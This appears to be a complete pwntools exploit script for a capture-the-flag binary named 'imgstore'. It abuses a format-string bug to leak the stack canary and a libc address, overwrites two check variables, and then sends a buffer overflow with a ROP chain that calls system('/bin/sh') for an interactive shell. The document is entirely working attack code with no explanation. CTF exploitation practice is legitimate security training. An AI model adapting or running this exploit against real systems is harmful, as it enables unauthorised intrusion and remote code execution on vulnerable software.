from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./imgstore")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("imgstore.chal.imaginaryctf.org", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def leak_n_address(io, n):

    payload = f"%{n}$lX"

    io.sendlineafter(": ", payload.encode())

    io.recvuntil(b"Book title --> ")

    #return f"{n}: " + io.recvline().decode().strip()
    return io.recvline().decode().strip()

#context.terminal = ['gnome-terminal', '-e']
context.terminal = ['kitty', '--']

def fuzzing(io):
    #io.sendlineafter(">> ", b"3")
    for i in range(100):
        print(leak_n_address(io, i))
        io.sendlineafter(": ", b"y")

io = start()

io.sendlineafter(">> ", b"1")

io.sendlineafter("[>] Press enter to return to menu..", b"")

io.sendlineafter(">> ", b"3")

canary = int(leak_n_address(io, 17), 16) # canary

print(f"[+] Canary: {hex(canary)}")

io.sendlineafter(": ", b"y")

leak_libc = int(leak_n_address(io, 9), 16) - 275 # libc

print(f"[+] Leak Libc: {hex(leak_libc)}")

libc.address = leak_libc - libc.symbols._IO_file_overflow

io.sendlineafter(": ", b"y")

var_address = int(leak_n_address(io, 15), 16) - 120

io.sendlineafter(": ", b"y")

cmp_var_address = int(leak_n_address(io, 12), 16) + 12360

print(f"[+] Var: {hex(var_address)}")
print(f"[+] Cmp Var Address: {hex(cmp_var_address)}")

io.sendlineafter(": ", b"y")

leak_var_value = leak_n_address(io, 7)

print(f"[+] Value of Var: {leak_var_value}")

#io.sendlineafter(": ", b"y")
#fuzzing(io)

payload = fmtstr_payload(8, {cmp_var_address: 0x87354e85}, write_size='short')

io.sendlineafter(": ", b"y")
io.sendlineafter(": ", payload)

payload = fmtstr_payload(8, {var_address: 0x1337}, write_size='short')
io.sendlineafter(": ", b"y")
io.sendlineafter(": ", payload)

rop = ROP(libc)

ret_gadget = rop.find_gadget(['ret'])[0]
pop_rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]

print(f"[+] pop rdi: {hex(pop_rdi_gadget)}")
print(f"[+] ret: {hex(ret_gadget)}")

payload = b"".join([
    b"A"*104,
    p64(canary),
    b"B"*8,
    p64(pop_rdi_gadget),
    p64(next(libc.search(b'/bin/sh'))),
    p64(ret_gadget),
    p64(libc.symbols.system)
])

io.sendlineafter("> ", payload)

io.interactive()